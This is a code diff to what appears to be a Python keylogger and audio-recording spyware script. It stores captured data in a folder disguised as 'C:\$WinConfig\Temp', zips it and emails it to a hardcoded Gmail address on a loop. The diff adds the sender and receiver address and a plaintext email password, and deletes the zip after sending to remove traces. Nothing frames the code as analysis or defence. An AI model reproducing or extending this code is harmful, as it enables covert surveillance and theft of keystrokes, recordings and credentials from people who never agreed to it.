@@ -15,9 +15,9 @@ dir = "C:\$WinConfig\Temp"
 # default aduio record and key logging duration 
 default_duration = 10
 # emaill address and password
-default_send_email_address = ""
-default_receive_email_address = ""
-default_email_password = ""
+send_email_address = "samplereciver97@gmail.com"
+receive_email_address = "samplereciver97@gmail.com"
+email_password = "1234.abcd"
 
 try: 
     os.makedirs(dir)
@@ -46,8 +46,9 @@ def task():
     zip_file(dir)
 
     # send email with the zip attachment 
-    email = SendEmail(default_send_email_address, default_receive_email_address, default_email_password, dir)
+    email = SendEmail(send_email_address, receive_email_address, email_password, dir)
     email.send()
+    os.remove(dir + '\data.zip')
 
 if __name__ == '__main__':
     while True:
